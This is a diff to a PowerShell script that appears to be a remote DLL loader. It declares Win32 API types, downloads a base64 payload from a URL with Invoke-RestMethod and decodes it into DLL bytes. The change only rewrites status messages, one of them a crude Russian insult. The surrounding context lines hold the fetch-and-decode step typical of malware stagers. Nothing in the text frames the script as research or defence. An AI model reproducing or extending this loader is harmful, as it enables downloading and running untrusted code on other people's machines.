@@ -47,11 +47,11 @@ if (-not ([System.Management.Automation.PSTypeName]'Win32').Type) {
 try {
     $base64String = Invoke-RestMethod -Uri $Url -UseBasicParsing -ErrorAction Stop
 } catch {
-    Write-Error "Не удалось скачать файл: $($_.Exception.Message)"
+    Write-Error "интярнет канекшн: $($_.Exception.Message)"
     return
 }
 $base64String = ($base64String -replace '\s', '')
-Write-Host "[+] Подсчет батьков артема - $($base64String.Length) " -ForegroundColor Green
+Write-Host "[+] Подсчет батьков - $($base64String.Length) " -ForegroundColor Green
 
 try {
     $dllBytes = [System.Convert]::FromBase64String($base64String)
